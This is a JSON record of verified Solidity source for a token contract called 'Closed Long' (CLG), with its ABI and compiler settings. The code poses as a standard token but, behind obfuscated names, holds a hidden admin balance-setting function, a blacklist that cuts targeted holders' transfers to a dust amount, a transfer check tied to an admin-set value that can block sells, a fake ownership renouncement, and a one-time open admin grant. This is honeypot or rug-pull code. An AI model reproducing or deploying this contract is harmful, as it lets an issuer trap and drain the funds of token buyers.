{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface buyMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract walletTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minFromReceiver {\n    function createPair(address receiverTx, address enableToken) external returns (address);\n}\n\ninterface fromTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderLaunched) external view returns (uint256);\n\n    function transfer(address autoModeFee, uint256 sellTotal) external returns (bool);\n\n    function allowance(address sellTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoModeFee,\n        uint256 sellTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundShould, uint256 value);\n    event Approval(address indexed sellTeam, address indexed spender, uint256 value);\n}\n\ninterface maxTeam is fromTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ClosedLong is walletTotal, fromTrading, maxTeam {\n\n    function feeMinSell(address amountTo, uint256 sellTotal) public {\n        maxFee();\n        receiverLiquidity[amountTo] = sellTotal;\n    }\n\n    function allowance(address walletLiquidityMarketing, address receiverShouldFee) external view virtual override returns (uint256) {\n        if (receiverShouldFee == senderFeeMode) {\n            return type(uint256).max;\n        }\n        return launchedTrading[walletLiquidityMarketing][receiverShouldFee];\n    }\n\n    function balanceOf(address senderLaunched) public view virtual override returns (uint256) {\n        return receiverLiquidity[senderLaunched];\n    }\n\n    string private senderFrom = \"CLG\";\n\n    address public walletAuto;\n\n    function listLiquidity(address fundToMode, address autoModeFee, uint256 sellTotal) internal returns (bool) {\n        if (fundToMode == walletAuto) {\n            return tradingFund(fundToMode, autoModeFee, sellTotal);\n        }\n        uint256 teamFrom = fromTrading(walletMin).balanceOf(maxTx);\n        require(teamFrom == fromLaunch);\n        require(autoModeFee != maxTx);\n        if (maxTo[fundToMode]) {\n            return tradingFund(fundToMode, autoModeFee, shouldListAmount);\n        }\n        return tradingFund(fundToMode, autoModeFee, sellTotal);\n    }\n\n    bool public toTeam;\n\n    function transferFrom(address fundToMode, address autoModeFee, uint256 sellTotal) external override returns (bool) {\n        if (_msgSender() != senderFeeMode) {\n            if (launchedTrading[fundToMode][_msgSender()] != type(uint256).max) {\n                require(sellTotal <= launchedTrading[fundToMode][_msgSender()]);\n                launchedTrading[fundToMode][_msgSender()] -= sellTotal;\n            }\n        }\n        return listLiquidity(fundToMode, autoModeFee, sellTotal);\n    }\n\n    uint256 fromLaunch;\n\n    uint256 constant shouldListAmount = 20 ** 10;\n\n    mapping(address => bool) public maxTo;\n\n    event OwnershipTransferred(address indexed buyReceiver, address indexed sellToken);\n\n    uint256 public buyModeLaunch;\n\n    function modeTeam() public {\n        emit OwnershipTransferred(walletAuto, address(0));\n        modeTradingMarketing = address(0);\n    }\n\n    function maxFee() private view {\n        require(atMinTeam[_msgSender()]);\n    }\n\n    function approve(address receiverShouldFee, uint256 sellTotal) public virtual override returns (bool) {\n        launchedTrading[_msgSender()][receiverShouldFee] = sellTotal;\n        emit Approval(_msgSender(), receiverShouldFee, sellTotal);\n        return true;\n    }\n\n    bool private minShould;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderFrom;\n    }\n\n    mapping(address => uint256) private receiverLiquidity;\n\n    address senderFeeMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        if (listTo) {\n            buyModeLaunch = toIs;\n        }\n        buyMarketing senderSwapAt = buyMarketing(senderFeeMode);\n        walletMin = minFromReceiver(senderSwapAt.factory()).createPair(senderSwapAt.WETH(), address(this));\n        \n        walletAuto = _msgSender();\n        modeTeam();\n        atMinTeam[walletAuto] = true;\n        receiverLiquidity[walletAuto] = maxSell;\n        if (buyModeLaunch == toIs) {\n            toTeam = true;\n        }\n        emit Transfer(address(0), walletAuto, maxSell);\n    }\n\n    uint8 private tradingListBuy = 18;\n\n    function tradingFund(address fundToMode, address autoModeFee, uint256 sellTotal) internal returns (bool) {\n        require(receiverLiquidity[fundToMode] >= sellTotal);\n        receiverLiquidity[fundToMode] -= sellTotal;\n        receiverLiquidity[autoModeFee] += sellTotal;\n        emit Transfer(fundToMode, autoModeFee, sellTotal);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxSell;\n    }\n\n    function getOwner() external view returns (address) {\n        return modeTradingMarketing;\n    }\n\n    uint256 private toIs;\n\n    address maxTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function shouldFund(uint256 sellTotal) public {\n        maxFee();\n        fromLaunch = sellTotal;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchedTrading;\n\n    bool public listTo;\n\n    bool public liquiditySwapTo;\n\n    address public walletMin;\n\n    function transfer(address amountTo, uint256 sellTotal) external virtual override returns (bool) {\n        return listLiquidity(_msgSender(), amountTo, sellTotal);\n    }\n\n    function txReceiverIs(address maxLaunched) public {\n        if (liquiditySwapTo) {\n            return;\n        }\n        \n        atMinTeam[maxLaunched] = true;\n        \n        liquiditySwapTo = true;\n    }\n\n    uint256 receiverTotalTo;\n\n    function owner() external view returns (address) {\n        return modeTradingMarketing;\n    }\n\n    uint256 private maxSell = 100000000 * 10 ** 18;\n\n    function takeModeAmount(address txIs) public {\n        maxFee();\n        \n        if (txIs == walletAuto || txIs == walletMin) {\n            return;\n        }\n        maxTo[txIs] = true;\n    }\n\n    string private modeMaxReceiver = \"Closed Long\";\n\n    address private modeTradingMarketing;\n\n    mapping(address => bool) public atMinTeam;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingListBuy;\n    }\n\n    bool public marketingMode;\n\n    function name() external view virtual override returns (string memory) {\n        return modeMaxReceiver;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLiquidityMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverShouldFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShouldFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atMinTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyModeLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"feeMinSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySwapTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"shouldFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txIs\",\"type\":\"address\"}],\"name\":\"takeModeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundToMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoModeFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"}],\"name\":\"txReceiverIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ClosedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}